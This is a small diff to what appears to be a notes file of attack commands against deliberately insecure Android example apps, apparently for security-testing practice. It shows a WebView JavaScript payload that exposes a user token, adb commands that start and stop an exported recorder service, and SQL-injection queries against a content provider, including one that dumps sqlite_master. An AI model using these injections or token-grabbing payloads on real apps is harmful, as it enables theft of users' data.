@@ -47,3 +47,10 @@ alert("token: " + Android.getUserToken());
 
 adb shell am stopservice com.example.insecureservice/.RecorderService
 adb shell am startservice com.example.insecureservice/.RecorderService
+
+
+adb shell
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "*"
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "'"
+content query --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/ --projection  "* from sqlite_master --"
+content insert --uri content://com.example.insecurecontentprovider.DataUserContentProvider/datausers/  --bind name:s:"x2" 
